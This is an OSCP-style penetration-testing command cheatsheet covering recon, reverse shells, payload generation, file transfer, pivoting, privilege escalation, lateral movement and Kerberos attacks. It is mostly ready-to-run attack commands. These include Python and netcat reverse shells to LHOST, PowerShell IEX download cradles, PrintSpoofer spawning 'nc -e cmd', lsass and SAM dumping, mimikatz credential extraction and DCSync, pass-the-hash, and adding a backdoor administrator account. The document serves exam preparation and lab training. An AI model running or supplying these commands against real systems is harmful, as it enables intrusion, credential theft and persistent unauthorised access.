# OSCP Command Cheatsheet (Modernized 2026)

> Prefer **NetExec (`nxc`)** over CrackMapExec. Replace `LHOST` / `TARGET` / `DC` as needed.  
> BoK map: [required-knowledge-2026.md](../00-exam/required-knowledge-2026.md) · Index: [README.md](README.md)

## Online references

- https://book.hacktricks.xyz/
- https://swisskyrepo.github.io/PayloadsAllTheThings/
- https://lolbas-project.github.io/
- https://gtfobins.github.io/
- https://wadcoms.github.io/
- https://orange-cyberdefense.github.io/ocd-mindmaps/
- https://www.ired.team/ (Kerberos / AD)
- https://github.com/Pennyw0rth/NetExec
- https://github.com/0xsyr0/OSCP (community mega-sheet — use as reference, not a dump)
- https://github.com/OlivierLaflamme/Cheatsheet-God (topic sheets — OSCP-relevant only)

Also: [transfer-and-shells.md](transfer-and-shells.md) · [ad-quick.md](ad-quick.md) · [privesc-quick.md](privesc-quick.md) · [../03-initial-access/web-attacks.md](../03-initial-access/web-attacks.md)

---

## Recon

```bash
nmap -Pn -T4 --top-ports 1000 -oA scans/quick TARGET
nmap --open -Pn -p- -sV -sC -T4 -oA scans/full TARGET
nmap -p- -v -A -T4 -oA scans/aggressive TARGET
# Through SOCKS pivot: use -sT, not SYN
proxychains -q nmap -Pn -sT -p 445,3389,5985,80,443 INTERNAL
sudo autorecon TARGET --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Web enum (quick)

```bash
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/ferox_TARGET.txt
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,403
ffuf -u http://TARGET -H 'Host: FUZZ.TARGET' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
whatweb -a 3 http://TARGET
nikto -h http://TARGET   # allowed example; still read output, do not spray-and-pray
```

### SMB / service enum

```bash
nxc smb TARGET
nxc smb TARGET -u '' -p '' --shares
nxc smb TARGET -u USER -p PASS --shares --users --groups
smbclient -N -L //TARGET
smbclient //TARGET/SHARE -U 'USER%PASS'
enum4linux-ng -A TARGET
```

---

## Proof capture

```cmd
:: Windows
hostname & whoami & ipconfig /all
type C:\Users\Administrator\Desktop\proof.txt
```

```bash
# Linux
echo; echo uname:; uname -a; echo hostname:; hostname; echo id:; id; echo ip:; ip a; echo proof:; cat /root/proof.txt 2>/dev/null
```

---

## TTY upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
reset
export SHELL=bash TERM=xterm-256color
```

---

## Reverse shells

```bash
# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f
```

```powershell
# Nishang-style
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress LHOST -Port 8088
```

---

## msfvenom + Metasploit exam habit

**Exam policy (confirm guide):** `msfvenom` and `multi/handler` are fine broadly. Auxiliary / Exploit / Post modules and **Meterpreter** may only target **one** chosen host (locked on first use). Prefer **manual** shells; never multi-host pivot via MSF.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443  EXITFUNC=thread -f exe -o shell_443.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8080 EXITFUNC=thread -f exe -o shell_8080.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53   EXITFUNC=thread -f exe -o shell_53.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80   EXITFUNC=thread -f exe -o shell_80.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi  -o reverse.msi
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=tun0 LPORT=443 -f elf  -o shell.elf
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war
```

```bash
# multi/handler (manual shell preferred over Meterpreter for multi-host work)
msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 443; run'
```

---

## File transfer

### Host on Kali

```bash
python3 -m http.server 80
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user simon -password 'Password123!'
```

### Windows pull

```cmd
certutil -urlcache -f http://LHOST/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://LHOST/winpeas.exe winpeas.exe
certutil -urlcache -f http://LHOST/Rubeus.exe Rubeus.exe
certutil -urlcache -f http://LHOST/nc.exe nc.exe
certutil -urlcache -f http://LHOST/chisel.exe chisel.exe
certutil -urlcache -f http://LHOST/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://LHOST/PowerUp.ps1 PowerUp.ps1
certutil -urlcache -f http://LHOST/PowerView.ps1 PowerView.ps1
certutil -urlcache -f http://LHOST/procdump.exe procdump.exe
```

```powershell
IEX (iwr -uri http://LHOST/pwn.ps1 -usebasicparsing)
iwr -uri http://LHOST/tool.exe -outfile tool.exe

# Auth SMB map
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('simon', $pass)
New-PSDrive -Name share -PSProvider FileSystem -Credential $cred -Root \\LHOST\share
```

---

## Pivoting

Full playbook: [../06-pivoting/tunneling.md](../06-pivoting/tunneling.md)

```bash
# Chisel SOCKS
./chisel server -p 8001 --reverse
# victim: ./chisel client LHOST:8001 R:1080:socks
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains -q nmap -Pn -sT -p 445,3389,5985 172.16.x.x
proxychains -q nxc smb 172.16.x.0/24 -u user -p pass
```

```bash
# ligolo-ng TUN (often preferred — tools without proxychains)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# victim: ./agent -connect LHOST:11601 -ignore-cert
# ligolo console: session → start
sudo ip route add 172.16.x.0/24 dev ligolo
nmap -Pn -sV -p 445,3389,5985 172.16.x.x
```

```bash
# SSH pivots (Linux foothold)
ssh -D 1080 user@PIVOT                              # dynamic SOCKS
ssh -L 8443:INTERNAL:443 user@PIVOT                 # local forward
ssh -R 443:127.0.0.1:443 user@PIVOT                 # remote: internal → Kali listener
ssh -L 5985:INTERNAL:5985 user@PIVOT                # then evil-winrm -i 127.0.0.1
```

---

## Windows privesc quick

```cmd
whoami /priv
PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -c "nc.exe LHOST 53 -e cmd"
winpeas.exe
schtasks /query /fo LIST /v
msiexec /quiet /qn /i reverse.msi
```

```powershell
type (Get-PSReadlineOption).HistorySavePath
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-CimInstance Win32_Service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
```

### SeBackupPrivilege

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\temp\SAM -Overwrite
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM -Overwrite
```

```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## Linux privesc quick

```bash
sudo -l
id; uname -a
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
ls -lah /etc/cron*
cat /etc/crontab
env; cat ~/.bashrc; history
getcap -r / 2>/dev/null
```

---

## RDP / users

```cmd
net user simon P@ssword123 /add
net localgroup administrators simon /add
net localgroup "Remote Desktop Users" simon /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -Force
```

```bash
xfreerdp /v:TARGET /u:DOMAIN\\user /pth:NTHASH /cert:ignore +clipboard /dynamic-resolution
xfreerdp /v:TARGET /u:user /p:pass /cert:ignore +clipboard
```

---

## NetExec / lateral

```bash
nxc smb TARGET -u user -p pass
nxc smb TARGET -u user -H NTHASH -x 'whoami'
nxc smb CIDR -u user -p pass --continue-on-success
nxc smb CIDR --gen-relay-list relay.txt
nxc winrm TARGET -u user -p pass
nxc winrm TARGET -u user -H NTHASH -x 'whoami'
```

```bash
# Impacket
impacket-psexec domain/user:pass@TARGET
impacket-psexec -hashes :NTHASH domain/user@TARGET
impacket-psexec -k -no-pass domain.local/user@host.domain.local -dc-ip DC
impacket-wmiexec -hashes :NTHASH domain/user@TARGET
impacket-secretsdump domain/user:pass@TARGET
impacket-secretsdump -just-dc domain/da:pass@DC
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request -outputfile tgs.txt
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC -format hashcat
impacket-GetADUsers domain/user:pass -dc-ip DC
impacket-ntlmrelayx -smb2support -t smb://TARGET -c 'whoami /all' -debug
```

```bash
evil-winrm -i TARGET -u 'domain\user' -p 'pass'
evil-winrm -i TARGET -u 'domain\user' -H 'NTHASH'
```

```powershell
Invoke-Command -ComputerName HOST -ScriptBlock { whoami }
Enter-PSSession -ComputerName HOST
```

| Tool | Ports |
|------|-------|
| psexec / smbexec / atexec | 445 |
| wmiexec | 135, 445 |
| dcomexec | 135, 445 |
| evil-winrm | 5985/5986 |

---

## Kerberos / tickets

```bash
timedatectl set-ntp 0 && sudo ntpdate DC
export KRB5CCNAME=/tmp/ticket.ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
```

```text
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::dcsync /all /csv
mimikatz # sekurlsa::pth /user:U /domain:D /ntlm:HASH /run:powershell.exe
```

```powershell
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<b64>"))
```

---

## MSSQL

```bash
impacket-mssqlclient domain/user:pass@TARGET -windows-auth
impacket-mssqlclient -k -no-pass domain/user@sqlhost
```

```sql
SELECT SYSTEM_USER; SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC master..xp_dirtree '\\LHOST\share';
EXEC sp_linkedservers;
EXECUTE AS LOGIN = 'sa';
EXEC ('xp_cmdshell ''whoami'';') AT LINKED;
SELECT * FROM OPENQUERY("LINKED", 'SELECT @@version');
```

---

## Cracking

```bash
hashcat -m 1000  ntlm.txt wordlist.txt          # NTLM
hashcat -m 5600  ntlmv2.txt wordlist.txt        # NetNTLMv2
hashcat -m 13100 tgs.txt wordlist.txt           # Kerberoast
hashcat -m 18200 asrep.txt wordlist.txt         # AS-REP
hashcat -m 16900 ansible.hash wordlist.txt      # Ansible vault
ssh2john id_rsa > ssh.hash && john --wordlist=rockyou.txt ssh.hash
keepass2john vault.kdbx > kp.hash
```

---

## Mimikatz one-liner

```text
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "sekurlsa::ekeys" "sekurlsa::tickets" "lsadump::sam" "lsadump::cache" "lsadump::secrets" "exit"
```

---

## BloodHound Cypher (starter)

```cypher
MATCH (u:Computer) RETURN u.name
MATCH (n)-[r]->(g) WHERE r.isacl = true RETURN DISTINCT n.name
```

---

## SNMP

```bash
snmpbulkwalk -v2c -c public TARGET .
onesixtyone -c communities.txt TARGET
```

---

## Misc

```bash
# Color dump of commands file
tput setaf 3; cat cheatsheets/commands.md
```
